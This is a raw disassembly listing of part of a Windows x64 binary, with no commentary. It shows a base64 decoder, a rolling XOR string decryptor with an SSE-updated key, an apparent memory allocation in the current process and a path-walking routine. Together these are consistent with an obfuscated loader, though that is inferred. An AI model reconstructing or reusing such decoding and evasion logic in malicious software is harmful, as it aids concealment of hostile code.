   140002d3d:	00 
   140002d3e:	48 b8 01 00 38 00 4b 	movabs $0x38004b00380001,%rax
   140002d45:	00 38 00 
   140002d48:	48 89 05 51 06 2c 00 	mov    %rax,0x2c0651(%rip)        # 0x1402c33a0
   140002d4f:	66 c7 05 50 06 2c 00 	movw   $0xd3,0x2c0650(%rip)        # 0x1402c33a8
   140002d56:	d3 00 
   140002d58:	48 8d 0d 41 00 00 00 	lea    0x41(%rip),%rcx        # 0x140002da0
   140002d5f:	e8 0c e6 ff ff       	call   0x140001370
   140002d64:	c6 05 03 05 2c 00 01 	movb   $0x1,0x2c0503(%rip)        # 0x1402c326e
   140002d6b:	e9 aa f9 ff ff       	jmp    0x14000271a
   140002d70:	c6 05 47 06 2c 00 01 	movb   $0x1,0x2c0647(%rip)        # 0x1402c33be
   140002d77:	66 c7 05 3c 06 2c 00 	movw   $0xc7,0x2c063c(%rip)        # 0x1402c33bc
   140002d7e:	c7 00 
   140002d80:	48 8d 0d 59 00 00 00 	lea    0x59(%rip),%rcx        # 0x140002de0
   140002d87:	e8 e4 e5 ff ff       	call   0x140001370
   140002d8c:	c6 05 dd 04 2c 00 01 	movb   $0x1,0x2c04dd(%rip)        # 0x1402c3270
   140002d93:	e9 16 fc ff ff       	jmp    0x1400029ae
   140002d98:	cc                   	int3
   140002d99:	cc                   	int3
   140002d9a:	cc                   	int3
   140002d9b:	cc                   	int3
   140002d9c:	cc                   	int3
   140002d9d:	cc                   	int3
   140002d9e:	cc                   	int3
   140002d9f:	cc                   	int3
   140002da0:	0f 57 c0             	xorps  %xmm0,%xmm0
   140002da3:	0f 11 05 f0 05 2c 00 	movups %xmm0,0x2c05f0(%rip)        # 0x1402c339a
   140002daa:	0f 29 05 df 05 2c 00 	movaps %xmm0,0x2c05df(%rip)        # 0x1402c3390
   140002db1:	c3                   	ret
   140002db2:	cc                   	int3
   140002db3:	cc                   	int3
   140002db4:	cc                   	int3
   140002db5:	cc                   	int3
   140002db6:	cc                   	int3
   140002db7:	cc                   	int3
   140002db8:	cc                   	int3
   140002db9:	cc                   	int3
   140002dba:	cc                   	int3
   140002dbb:	cc                   	int3
   140002dbc:	cc                   	int3
   140002dbd:	cc                   	int3
   140002dbe:	cc                   	int3
   140002dbf:	cc                   	int3
   140002dc0:	66 c7 05 ef 05 2c 00 	movw   $0x0,0x2c05ef(%rip)        # 0x1402c33b8
   140002dc7:	00 00 
   140002dc9:	48 c7 05 dc 05 2c 00 	movq   $0x0,0x2c05dc(%rip)        # 0x1402c33b0
   140002dd0:	00 00 00 00 
   140002dd4:	c3                   	ret
   140002dd5:	cc                   	int3
   140002dd6:	cc                   	int3
   140002dd7:	cc                   	int3
   140002dd8:	cc                   	int3
   140002dd9:	cc                   	int3
   140002dda:	cc                   	int3
   140002ddb:	cc                   	int3
   140002ddc:	cc                   	int3
   140002ddd:	cc                   	int3
   140002dde:	cc                   	int3
   140002ddf:	cc                   	int3
   140002de0:	66 c7 05 d3 05 2c 00 	movw   $0x0,0x2c05d3(%rip)        # 0x1402c33bc
   140002de7:	00 00 
   140002de9:	c3                   	ret
   140002dea:	cc                   	int3
   140002deb:	cc                   	int3
   140002dec:	cc                   	int3
   140002ded:	cc                   	int3
   140002dee:	cc                   	int3
   140002def:	cc                   	int3
   140002df0:	41 56                	push   %r14
   140002df2:	56                   	push   %rsi
   140002df3:	57                   	push   %rdi
   140002df4:	55                   	push   %rbp
   140002df5:	53                   	push   %rbx
   140002df6:	b8 60 00 01 00       	mov    $0x10060,%eax
   140002dfb:	e8 60 f8 ff ff       	call   0x140002660
   140002e00:	48 29 c4             	sub    %rax,%rsp
   140002e03:	4d 89 ce             	mov    %r9,%r14
   140002e06:	4c 89 c7             	mov    %r8,%rdi
   140002e09:	48 89 d6             	mov    %rdx,%rsi
   140002e0c:	89 cb                	mov    %ecx,%ebx
   140002e0e:	31 ed                	xor    %ebp,%ebp
   140002e10:	48 8d 4c 24 60       	lea    0x60(%rsp),%rcx
   140002e15:	41 b8 fe ff 00 00    	mov    $0xfffe,%r8d
   140002e1b:	31 d2                	xor    %edx,%edx
   140002e1d:	e8 3e 72 00 00       	call   0x14000a060
   140002e22:	48 8d 84 24 b0 00 01 	lea    0x100b0(%rsp),%rax
   140002e29:	00 
   140002e2a:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
   140002e2f:	41 0f b7 0e          	movzwl (%r14),%ecx
   140002e33:	66 85 c9             	test   %cx,%cx
   140002e36:	0f 84 bf 00 00 00    	je     0x140002efb
   140002e3c:	31 ed                	xor    %ebp,%ebp
   140002e3e:	48 8b 44 24 38       	mov    0x38(%rsp),%rax
   140002e43:	eb 2e                	jmp    0x140002e73
   140002e45:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   140002e4c:	00 00 00 00 
   140002e50:	ff c5                	inc    %ebp
   140002e52:	66 89 4c 54 60       	mov    %cx,0x60(%rsp,%rdx,2)
   140002e57:	31 d2                	xor    %edx,%edx
   140002e59:	66 41 83 3e 00       	cmpw   $0x0,(%r14)
   140002e5e:	0f 95 c2             	setne  %dl
   140002e61:	41 0f b7 0c 56       	movzwl (%r14,%rdx,2),%ecx
   140002e66:	4d 8d 34 56          	lea    (%r14,%rdx,2),%r14
   140002e6a:	66 85 c9             	test   %cx,%cx
   140002e6d:	0f 84 88 00 00 00    	je     0x140002efb
   140002e73:	81 fd fd 7f 00 00    	cmp    $0x7ffd,%ebp
   140002e79:	0f 87 7c 00 00 00    	ja     0x140002efb
   140002e7f:	48 63 d5             	movslq %ebp,%rdx
   140002e82:	66 83 f9 25          	cmp    $0x25,%cx
   140002e86:	75 c8                	jne    0x140002e50
   140002e88:	49 8d 4e 02          	lea    0x2(%r14),%rcx
   140002e8c:	66 41 83 7e 02 53    	cmpw   $0x53,0x2(%r14)
   140002e92:	75 51                	jne    0x140002ee5
   140002e94:	4c 8d 40 08          	lea    0x8(%rax),%r8
   140002e98:	4c 89 44 24 38       	mov    %r8,0x38(%rsp)
   140002e9d:	48 8b 00             	mov    (%rax),%rax
   140002ea0:	44 0f b7 10          	movzwl (%rax),%r10d
   140002ea4:	66 45 85 d2          	test   %r10w,%r10w
   140002ea8:	74 38                	je     0x140002ee2
   140002eaa:	48 81 fa ff 7f 00 00 	cmp    $0x7fff,%rdx
   140002eb1:	41 b9 fe 7f 00 00    	mov    $0x7ffe,%r9d
   140002eb7:	4c 0f 43 ca          	cmovae %rdx,%r9
   140002ebb:	48 83 c0 02          	add    $0x2,%rax
   140002ebf:	90                   	nop
   140002ec0:	48 81 fa fd 7f 00 00 	cmp    $0x7ffd,%rdx
   140002ec7:	77 24                	ja     0x140002eed
   140002ec9:	ff c5                	inc    %ebp
   140002ecb:	66 44 89 54 54 60    	mov    %r10w,0x60(%rsp,%rdx,2)
   140002ed1:	48 ff c2             	inc    %rdx
   140002ed4:	44 0f b7 10          	movzwl (%rax),%r10d
   140002ed8:	48 83 c0 02          	add    $0x2,%rax
   140002edc:	66 45 85 d2          	test   %r10w,%r10w
   140002ee0:	75 de                	jne    0x140002ec0
   140002ee2:	4c 89 c0             	mov    %r8,%rax
   140002ee5:	49 89 ce             	mov    %rcx,%r14
   140002ee8:	e9 6a ff ff ff       	jmp    0x140002e57
   140002eed:	4c 89 c0             	mov    %r8,%rax
   140002ef0:	44 89 cd             	mov    %r9d,%ebp
   140002ef3:	49 89 ce             	mov    %rcx,%r14
   140002ef6:	e9 5c ff ff ff       	jmp    0x140002e57
   140002efb:	48 63 c5             	movslq %ebp,%rax
   140002efe:	66 c7 44 44 60 00 00 	movw   $0x0,0x60(%rsp,%rax,2)
   140002f05:	c7 44 24 28 00 00 00 	movl   $0x0,0x28(%rsp)
   140002f0c:	00 
   140002f0d:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   140002f14:	00 00 
   140002f16:	48 8d 4c 24 48       	lea    0x48(%rsp),%rcx
   140002f1b:	4c 8d 44 24 60       	lea    0x60(%rsp),%r8
   140002f20:	48 89 fa             	mov    %rdi,%rdx
   140002f23:	49 89 f1             	mov    %rsi,%r9
   140002f26:	e8 65 f7 ff ff       	call   0x140002690
   140002f2b:	48 8b 4c 24 50       	mov    0x50(%rsp),%rcx
   140002f30:	e8 29 e5 ff ff       	call   0x14000145e
   140002f35:	84 db                	test   %bl,%bl
   140002f37:	74 1a                	je     0x140002f53
   140002f39:	48 c7 44 24 40 00 5d 	movq   $0xffffffffee1e5d00,0x40(%rsp)
   140002f40:	1e ee 
   140002f42:	48 8b 4c 24 48       	mov    0x48(%rsp),%rcx
   140002f47:	4c 8d 44 24 40       	lea    0x40(%rsp),%r8
   140002f4c:	31 d2                	xor    %edx,%edx
   140002f4e:	e8 bf e5 ff ff       	call   0x140001512
   140002f53:	48 8b 4c 24 48       	mov    0x48(%rsp),%rcx
   140002f58:	e8 01 e5 ff ff       	call   0x14000145e
   140002f5d:	90                   	nop
   140002f5e:	48 81 c4 60 00 01 00 	add    $0x10060,%rsp
   140002f65:	5b                   	pop    %rbx
   140002f66:	5d                   	pop    %rbp
   140002f67:	5f                   	pop    %rdi
   140002f68:	5e                   	pop    %rsi
   140002f69:	41 5e                	pop    %r14
   140002f6b:	c3                   	ret
   140002f6c:	cc                   	int3
   140002f6d:	cc                   	int3
   140002f6e:	cc                   	int3
   140002f6f:	cc                   	int3
   140002f70:	41 56                	push   %r14
   140002f72:	56                   	push   %rsi
   140002f73:	57                   	push   %rdi
   140002f74:	55                   	push   %rbp
   140002f75:	53                   	push   %rbx
   140002f76:	48 83 ec 40          	sub    $0x40,%rsp
   140002f7a:	4c 89 c6             	mov    %r8,%rsi
   140002f7d:	48 89 d7             	mov    %rdx,%rdi
   140002f80:	48 89 cb             	mov    %rcx,%rbx
   140002f83:	e8 58 02 00 00       	call   0x1400031e0
   140002f88:	48 89 f8             	mov    %rdi,%rax
   140002f8b:	48 c1 e8 02          	shr    $0x2,%rax
   140002f8f:	48 8d 04 40          	lea    (%rax,%rax,2),%rax
   140002f93:	48 89 06             	mov    %rax,(%rsi)
   140002f96:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
   140002f9b:	48 c7 44 24 30 00 00 	movq   $0x0,0x30(%rsp)
   140002fa2:	00 00 
   140002fa4:	c7 44 24 28 04 00 00 	movl   $0x4,0x28(%rsp)
   140002fab:	00 
   140002fac:	c7 44 24 20 00 10 00 	movl   $0x1000,0x20(%rsp)
   140002fb3:	00 
   140002fb4:	48 8d 54 24 30       	lea    0x30(%rsp),%rdx
   140002fb9:	45 31 f6             	xor    %r14d,%r14d
   140002fbc:	4c 8d 4c 24 38       	lea    0x38(%rsp),%r9
   140002fc1:	48 c7 c1 ff ff ff ff 	mov    $0xffffffffffffffff,%rcx
   140002fc8:	45 31 c0             	xor    %r8d,%r8d
   140002fcb:	e8 d9 e4 ff ff       	call   0x1400014a9
   140002fd0:	48 8b 6c 24 30       	mov    0x30(%rsp),%rbp
   140002fd5:	41 b9 3e 00 00 00    	mov    $0x3e,%r9d
   140002fdb:	31 c9                	xor    %ecx,%ecx
   140002fdd:	eb 11                	jmp    0x140002ff0
   140002fdf:	90                   	nop
   140002fe0:	49 83 c6 04          	add    $0x4,%r14
   140002fe4:	48 89 d1             	mov    %rdx,%rcx
   140002fe7:	49 39 fe             	cmp    %rdi,%r14
   140002fea:	0f 83 d1 01 00 00    	jae    0x1400031c1
   140002ff0:	42 0f b6 04 33       	movzbl (%rbx,%r14,1),%eax
   140002ff5:	8d 50 a5             	lea    -0x5b(%rax),%edx
   140002ff8:	80 fa e6             	cmp    $0xe6,%dl
   140002ffb:	73 33                	jae    0x140003030
   140002ffd:	8d 50 85             	lea    -0x7b(%rax),%edx
   140003000:	80 fa e6             	cmp    $0xe6,%dl
   140003003:	73 3b                	jae    0x140003040
   140003005:	8d 50 c6             	lea    -0x3a(%rax),%edx
   140003008:	80 fa f6             	cmp    $0xf6,%dl
   14000300b:	73 38                	jae    0x140003045
   14000300d:	ba 3f 00 00 00       	mov    $0x3f,%edx
   140003012:	83 f8 2f             	cmp    $0x2f,%eax
   140003015:	74 02                	je     0x140003019
   140003017:	31 d2                	xor    %edx,%edx
   140003019:	83 f8 2b             	cmp    $0x2b,%eax
   14000301c:	41 0f 44 d1          	cmove  %r9d,%edx
   140003020:	eb 30                	jmp    0x140003052
   140003022:	66 66 66 66 66 2e 0f 	data16 data16 data16 data16 cs nopw 0x0(%rax,%rax,1)
   140003029:	1f 84 00 00 00 00 00 
   140003030:	83 c0 bf             	add    $0xffffffbf,%eax
   140003033:	eb 1b                	jmp    0x140003050
   140003035:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   14000303c:	00 00 00 00 
   140003040:	83 c0 b9             	add    $0xffffffb9,%eax
   140003043:	eb 0b                	jmp    0x140003050
   140003045:	83 c0 04             	add    $0x4,%eax
   140003048:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   14000304f:	00 
   140003050:	89 c2                	mov    %eax,%edx
   140003052:	42 0f b6 44 33 01    	movzbl 0x1(%rbx,%r14,1),%eax
   140003058:	44 8d 40 a5          	lea    -0x5b(%rax),%r8d
   14000305c:	41 80 f8 e6          	cmp    $0xe6,%r8b
   140003060:	73 2e                	jae    0x140003090
   140003062:	44 8d 40 85          	lea    -0x7b(%rax),%r8d
   140003066:	41 80 f8 e6          	cmp    $0xe6,%r8b
   14000306a:	73 34                	jae    0x1400030a0
   14000306c:	44 8d 40 c6          	lea    -0x3a(%rax),%r8d
   140003070:	41 80 f8 f6          	cmp    $0xf6,%r8b
   140003074:	73 2f                	jae    0x1400030a5
   140003076:	41 b8 3f 00 00 00    	mov    $0x3f,%r8d
   14000307c:	83 f8 2f             	cmp    $0x2f,%eax
   14000307f:	74 03                	je     0x140003084
   140003081:	45 31 c0             	xor    %r8d,%r8d
   140003084:	83 f8 2b             	cmp    $0x2b,%eax
   140003087:	45 0f 44 c1          	cmove  %r9d,%r8d
   14000308b:	eb 26                	jmp    0x1400030b3
   14000308d:	0f 1f 00             	nopl   (%rax)
   140003090:	83 c0 bf             	add    $0xffffffbf,%eax
   140003093:	eb 1b                	jmp    0x1400030b0
   140003095:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   14000309c:	00 00 00 00 
   1400030a0:	83 c0 b9             	add    $0xffffffb9,%eax
   1400030a3:	eb 0b                	jmp    0x1400030b0
   1400030a5:	83 c0 04             	add    $0x4,%eax
   1400030a8:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   1400030af:	00 
   1400030b0:	41 89 c0             	mov    %eax,%r8d
   1400030b3:	46 0f b6 54 33 02    	movzbl 0x2(%rbx,%r14,1),%r10d
   1400030b9:	41 8d 42 a5          	lea    -0x5b(%r10),%eax
   1400030bd:	3c e6                	cmp    $0xe6,%al
   1400030bf:	73 2f                	jae    0x1400030f0
   1400030c1:	41 8d 42 85          	lea    -0x7b(%r10),%eax
   1400030c5:	3c e6                	cmp    $0xe6,%al
   1400030c7:	73 37                	jae    0x140003100
   1400030c9:	41 8d 42 c6          	lea    -0x3a(%r10),%eax
   1400030cd:	3c f6                	cmp    $0xf6,%al
   1400030cf:	73 35                	jae    0x140003106
   1400030d1:	b8 3f 00 00 00       	mov    $0x3f,%eax
   1400030d6:	41 83 fa 2f          	cmp    $0x2f,%r10d
   1400030da:	74 02                	je     0x1400030de
   1400030dc:	31 c0                	xor    %eax,%eax
   1400030de:	41 83 fa 2b          	cmp    $0x2b,%r10d
   1400030e2:	41 0f 44 c1          	cmove  %r9d,%eax
   1400030e6:	eb 2b                	jmp    0x140003113
   1400030e8:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   1400030ef:	00 
   1400030f0:	41 83 c2 bf          	add    $0xffffffbf,%r10d
   1400030f4:	eb 1a                	jmp    0x140003110
   1400030f6:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
   1400030fd:	00 00 00 
   140003100:	41 83 c2 b9          	add    $0xffffffb9,%r10d
   140003104:	eb 0a                	jmp    0x140003110
   140003106:	41 83 c2 04          	add    $0x4,%r10d
   14000310a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   140003110:	44 89 d0             	mov    %r10d,%eax
   140003113:	46 0f b6 54 33 03    	movzbl 0x3(%rbx,%r14,1),%r10d
   140003119:	45 8d 5a a5          	lea    -0x5b(%r10),%r11d
   14000311d:	41 80 fb e6          	cmp    $0xe6,%r11b
   140003121:	73 2d                	jae    0x140003150
   140003123:	45 8d 5a 85          	lea    -0x7b(%r10),%r11d
   140003127:	41 80 fb e6          	cmp    $0xe6,%r11b
   14000312b:	73 33                	jae    0x140003160
   14000312d:	45 8d 5a c6          	lea    -0x3a(%r10),%r11d
   140003131:	41 80 fb f6          	cmp    $0xf6,%r11b
   140003135:	73 2f                	jae    0x140003166
   140003137:	41 bb 3f 00 00 00    	mov    $0x3f,%r11d
   14000313d:	41 83 fa 2f          	cmp    $0x2f,%r10d
   140003141:	74 03                	je     0x140003146
   140003143:	45 31 db             	xor    %r11d,%r11d
   140003146:	41 83 fa 2b          	cmp    $0x2b,%r10d
   14000314a:	45 0f 44 d9          	cmove  %r9d,%r11d
   14000314e:	eb 23                	jmp    0x140003173
   140003150:	41 83 c2 bf          	add    $0xffffffbf,%r10d
   140003154:	eb 1a                	jmp    0x140003170
   140003156:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
   14000315d:	00 00 00 
   140003160:	41 83 c2 b9          	add    $0xffffffb9,%r10d
   140003164:	eb 0a                	jmp    0x140003170
   140003166:	41 83 c2 04          	add    $0x4,%r10d
   14000316a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   140003170:	45 89 d3             	mov    %r10d,%r11d
   140003173:	c1 e2 12             	shl    $0x12,%edx
   140003176:	41 c1 e0 0c          	shl    $0xc,%r8d
   14000317a:	41 09 d0             	or     %edx,%r8d
   14000317d:	c1 e0 06             	shl    $0x6,%eax
   140003180:	44 09 d8             	or     %r11d,%eax
   140003183:	44 09 c0             	or     %r8d,%eax
   140003186:	41 89 c0             	mov    %eax,%r8d
   140003189:	41 c1 e8 10          	shr    $0x10,%r8d
   14000318d:	48 8d 51 01          	lea    0x1(%rcx),%rdx
   140003191:	44 88 44 0d 00       	mov    %r8b,0x0(%rbp,%rcx,1)
   140003196:	4c 8b 06             	mov    (%rsi),%r8
   140003199:	4c 39 c2             	cmp    %r8,%rdx
   14000319c:	73 0e                	jae    0x1400031ac
   14000319e:	88 64 0d 01          	mov    %ah,0x1(%rbp,%rcx,1)
   1400031a2:	48 83 c1 02          	add    $0x2,%rcx
   1400031a6:	4c 8b 06             	mov    (%rsi),%r8
   1400031a9:	48 89 ca             	mov    %rcx,%rdx
   1400031ac:	4c 39 c2             	cmp    %r8,%rdx
   1400031af:	0f 83 2b fe ff ff    	jae    0x140002fe0
   1400031b5:	88 44 15 00          	mov    %al,0x0(%rbp,%rdx,1)
   1400031b9:	48 ff c2             	inc    %rdx
   1400031bc:	e9 1f fe ff ff       	jmp    0x140002fe0
   1400031c1:	48 8b 16             	mov    (%rsi),%rdx
   1400031c4:	48 89 e9             	mov    %rbp,%rcx
   1400031c7:	e8 14 00 00 00       	call   0x1400031e0
   1400031cc:	48 89 e8             	mov    %rbp,%rax
   1400031cf:	48 83 c4 40          	add    $0x40,%rsp
   1400031d3:	5b                   	pop    %rbx
   1400031d4:	5d                   	pop    %rbp
   1400031d5:	5f                   	pop    %rdi
   1400031d6:	5e                   	pop    %rsi
   1400031d7:	41 5e                	pop    %r14
   1400031d9:	c3                   	ret
   1400031da:	cc                   	int3
   1400031db:	cc                   	int3
   1400031dc:	cc                   	int3
   1400031dd:	cc                   	int3
   1400031de:	cc                   	int3
   1400031df:	cc                   	int3
   1400031e0:	56                   	push   %rsi
   1400031e1:	57                   	push   %rdi
   1400031e2:	53                   	push   %rbx
   1400031e3:	48 83 ec 20          	sub    $0x20,%rsp
   1400031e7:	48 85 d2             	test   %rdx,%rdx
   1400031ea:	74 67                	je     0x140003253
   1400031ec:	48 89 d6             	mov    %rdx,%rsi
   1400031ef:	48 89 cf             	mov    %rcx,%rdi
   1400031f2:	0f b6 19             	movzbl (%rcx),%ebx
   1400031f5:	80 3d a4 00 2c 00 00 	cmpb   $0x0,0x2c00a4(%rip)        # 0x1402c32a0
   1400031fc:	0f 84 dc 00 00 00    	je     0x1400032de
   140003202:	80 3d 38 12 2c 00 00 	cmpb   $0x0,0x2c1238(%rip)        # 0x1402c4441
   140003209:	74 3a                	je     0x140003245
   14000320b:	66 0f 6f 05 bd 83 00 	movdqa 0x83bd(%rip),%xmm0        # 0x14000b5d0
   140003212:	00 
   140003213:	66 0f 6f 0d 05 12 2c 	movdqa 0x2c1205(%rip),%xmm1        # 0x1402c4420
   14000321a:	00 
   14000321b:	66 0f fc c8          	paddb  %xmm0,%xmm1
   14000321f:	66 0f 7f 0d f9 11 2c 	movdqa %xmm1,0x2c11f9(%rip)        # 0x1402c4420
   140003226:	00 
   140003227:	66 0f fc 05 01 12 2c 	paddb  0x2c1201(%rip),%xmm0        # 0x1402c4430
   14000322e:	00 
   14000322f:	66 0f 7f 05 f9 11 2c 	movdqa %xmm0,0x2c11f9(%rip)        # 0x1402c4430
   140003236:	00 
   140003237:	80 05 02 12 2c 00 e7 	addb   $0xe7,0x2c1202(%rip)        # 0x1402c4440
   14000323e:	c6 05 fc 11 2c 00 00 	movb   $0x0,0x2c11fc(%rip)        # 0x1402c4441
   140003245:	32 1d d5 11 2c 00    	xor    0x2c11d5(%rip),%bl        # 0x1402c4420
   14000324b:	88 1f                	mov    %bl,(%rdi)
   14000324d:	48 83 fe 01          	cmp    $0x1,%rsi
   140003251:	75 08                	jne    0x14000325b
   140003253:	48 83 c4 20          	add    $0x20,%rsp
   140003257:	5b                   	pop    %rbx
   140003258:	5f                   	pop    %rdi
   140003259:	5e                   	pop    %rsi
   14000325a:	c3                   	ret
   14000325b:	44 0f b6 05 de 11 2c 	movzbl 0x2c11de(%rip),%r8d        # 0x1402c4441
   140003262:	00 
   140003263:	66 0f 6f 05 b5 11 2c 	movdqa 0x2c11b5(%rip),%xmm0        # 0x1402c4420
   14000326a:	00 
   14000326b:	66 0f 6f 0d bd 11 2c 	movdqa 0x2c11bd(%rip),%xmm1        # 0x1402c4430
   140003272:	00 
   140003273:	b8 01 00 00 00       	mov    $0x1,%eax
   140003278:	0f b6 0d c1 11 2c 00 	movzbl 0x2c11c1(%rip),%ecx        # 0x1402c4440
   14000327f:	48 8d 15 9a 11 2c 00 	lea    0x2c119a(%rip),%rdx        # 0x1402c4420
   140003286:	66 0f 6f 15 42 83 00 	movdqa 0x8342(%rip),%xmm2        # 0x14000b5d0
   14000328d:	00 
   14000328e:	eb 17                	jmp    0x1400032a7
   140003290:	41 89 c2             	mov    %eax,%r10d
   140003293:	41 83 e2 1f          	and    $0x1f,%r10d
   140003297:	45 32 0c 12          	xor    (%r10,%rdx,1),%r9b
   14000329b:	44 88 0c 07          	mov    %r9b,(%rdi,%rax,1)
   14000329f:	48 ff c0             	inc    %rax
   1400032a2:	48 39 c6             	cmp    %rax,%rsi
   1400032a5:	74 ac                	je     0x140003253
   1400032a7:	44 0f b6 0c 07       	movzbl (%rdi,%rax,1),%r9d
   1400032ac:	45 84 c0             	test   %r8b,%r8b
   1400032af:	74 df                	je     0x140003290
   1400032b1:	66 0f fc c2          	paddb  %xmm2,%xmm0
   1400032b5:	66 0f 7f 05 63 11 2c 	movdqa %xmm0,0x2c1163(%rip)        # 0x1402c4420
   1400032bc:	00 
   1400032bd:	66 0f fc ca          	paddb  %xmm2,%xmm1
   1400032c1:	66 0f 7f 0d 67 11 2c 	movdqa %xmm1,0x2c1167(%rip)        # 0x1402c4430
   1400032c8:	00 
   1400032c9:	80 c1 e7             	add    $0xe7,%cl
   1400032cc:	88 0d 6e 11 2c 00    	mov    %cl,0x2c116e(%rip)        # 0x1402c4440
   1400032d2:	c6 05 68 11 2c 00 00 	movb   $0x0,0x2c1168(%rip)        # 0x1402c4441
   1400032d9:	45 31 c0             	xor    %r8d,%r8d
   1400032dc:	eb b2                	jmp    0x140003290
   1400032de:	0f 28 05 cb 82 00 00 	movaps 0x82cb(%rip),%xmm0        # 0x14000b5b0
   1400032e5:	0f 29 05 34 11 2c 00 	movaps %xmm0,0x2c1134(%rip)        # 0x1402c4420
   1400032ec:	66 0f 6f 05 cc 82 00 	movdqa 0x82cc(%rip),%xmm0        # 0x14000b5c0
   1400032f3:	00 
   1400032f4:	66 0f 7f 05 34 11 2c 	movdqa %xmm0,0x2c1134(%rip)        # 0x1402c4430
   1400032fb:	00 
   1400032fc:	66 c7 05 3b 11 2c 00 	movw   $0x119,0x2c113b(%rip)        # 0x1402c4440
   140003303:	19 01 
   140003305:	48 8d 0d 24 00 00 00 	lea    0x24(%rip),%rcx        # 0x140003330
   14000330c:	e8 5f e0 ff ff       	call   0x140001370
   140003311:	c6 05 88 ff 2b 00 01 	movb   $0x1,0x2bff88(%rip)        # 0x1402c32a0
   140003318:	80 3d 22 11 2c 00 00 	cmpb   $0x0,0x2c1122(%rip)        # 0x1402c4441
   14000331f:	0f 85 e6 fe ff ff    	jne    0x14000320b
   140003325:	e9 1b ff ff ff       	jmp    0x140003245
   14000332a:	cc                   	int3
   14000332b:	cc                   	int3
   14000332c:	cc                   	int3
   14000332d:	cc                   	int3
   14000332e:	cc                   	int3
   14000332f:	cc                   	int3
   140003330:	0f 57 c0             	xorps  %xmm0,%xmm0
   140003333:	0f 29 05 f6 10 2c 00 	movaps %xmm0,0x2c10f6(%rip)        # 0x1402c4430
   14000333a:	0f 29 05 df 10 2c 00 	movaps %xmm0,0x2c10df(%rip)        # 0x1402c4420
   140003341:	c6 05 f8 10 2c 00 00 	movb   $0x0,0x2c10f8(%rip)        # 0x1402c4440
   140003348:	c3                   	ret
   140003349:	cc                   	int3
   14000334a:	cc                   	int3
   14000334b:	cc                   	int3
   14000334c:	cc                   	int3
   14000334d:	cc                   	int3
   14000334e:	cc                   	int3
   14000334f:	cc                   	int3
   140003350:	41 57                	push   %r15
   140003352:	41 56                	push   %r14
   140003354:	41 55                	push   %r13
   140003356:	41 54                	push   %r12
   140003358:	56                   	push   %rsi
   140003359:	57                   	push   %rdi
   14000335a:	55                   	push   %rbp
   14000335b:	53                   	push   %rbx
   14000335c:	48 81 ec 28 05 00 00 	sub    $0x528,%rsp
   140003363:	66 44 0f 7f 84 24 10 	movdqa %xmm8,0x510(%rsp)
   14000336a:	05 00 00 
   14000336d:	66 0f 7f bc 24 00 05 	movdqa %xmm7,0x500(%rsp)
   140003374:	00 00 
   140003376:	0f 29 b4 24 f0 04 00 	movaps %xmm6,0x4f0(%rsp)
   14000337d:	00 
   14000337e:	44 89 44 24 74       	mov    %r8d,0x74(%rsp)
   140003383:	48 89 94 24 c8 00 00 	mov    %rdx,0xc8(%rsp)
   14000338a:	00 
   14000338b:	48 89 cb             	mov    %rcx,%rbx
   14000338e:	48 c7 44 24 78 00 00 	movq   $0x0,0x78(%rsp)
   140003395:	00 00 
   140003397:	0f 57 f6             	xorps  %xmm6,%xmm6
   14000339a:	0f 29 b4 24 b0 00 00 	movaps %xmm6,0xb0(%rsp)
   1400033a1:	00 
   1400033a2:	48 8d 8c 24 d0 00 00 	lea    0xd0(%rsp),%rcx
   1400033a9:	00 
   1400033aa:	41 b8 08 02 00 00    	mov    $0x208,%r8d
   1400033b0:	31 d2                	xor    %edx,%edx
   1400033b2:	e8 a9 6c 00 00       	call   0x14000a060
   1400033b7:	0f b7 03             	movzwl (%rbx),%eax
   1400033ba:	66 85 c0             	test   %ax,%ax
   1400033bd:	0f 84 fe 01 00 00    	je     0x1400035c1
   1400033c3:	4c 8d b4 24 e0 02 00 	lea    0x2e0(%rsp),%r14
   1400033ca:	00 
   1400033cb:	4c 8d a4 24 d0 00 00 	lea    0xd0(%rsp),%r12
   1400033d2:	00 
   1400033d3:	48 8d 7c 24 60       	lea    0x60(%rsp),%rdi
   1400033d8:	4c 8d 6c 24 78       	lea    0x78(%rsp),%r13
   1400033dd:	48 8d ac 24 80 00 00 	lea    0x80(%rsp),%rbp
   1400033e4:	00 
   1400033e5:	48 8d b4 24 b0 00 00 	lea    0xb0(%rsp),%rsi
   1400033ec:	00 
   1400033ed:	66 0f 6f 3d eb 81 00 	movdqa 0x81eb(%rip),%xmm7        # 0x14000b5e0
   1400033f4:	00 
   1400033f5:	66 44 0f 6f 05 f2 81 	movdqa 0x81f2(%rip),%xmm8        # 0x14000b5f0
   1400033fc:	00 00 
   1400033fe:	45 31 ff             	xor    %r15d,%r15d
   140003401:	eb 20                	jmp    0x140003423
   140003403:	66 66 66 66 2e 0f 1f 	data16 data16 data16 cs nopw 0x0(%rax,%rax,1)
   14000340a:	84 00 00 00 00 00 
   140003410:	42 0f b7 44 3b 02    	movzwl 0x2(%rbx,%r15,1),%eax
   140003416:	49 83 c7 02          	add    $0x2,%r15
   14000341a:	66 85 c0             	test   %ax,%ax
   14000341d:	0f 84 9e 01 00 00    	je     0x1400035c1
   140003423:	66 42 89 84 3c d0 00 	mov    %ax,0xd0(%rsp,%r15,1)
   14000342a:	00 00 
   14000342c:	66 83 f8 2f          	cmp    $0x2f,%ax
   140003430:	74 08                	je     0x14000343a
   140003432:	0f b7 c0             	movzwl %ax,%eax
   140003435:	83 f8 5c             	cmp    $0x5c,%eax
   140003438:	75 d6                	jne    0x140003410
   14000343a:	41 b8 10 02 00 00    	mov    $0x210,%r8d
   140003440:	4c 89 f1             	mov    %r14,%rcx
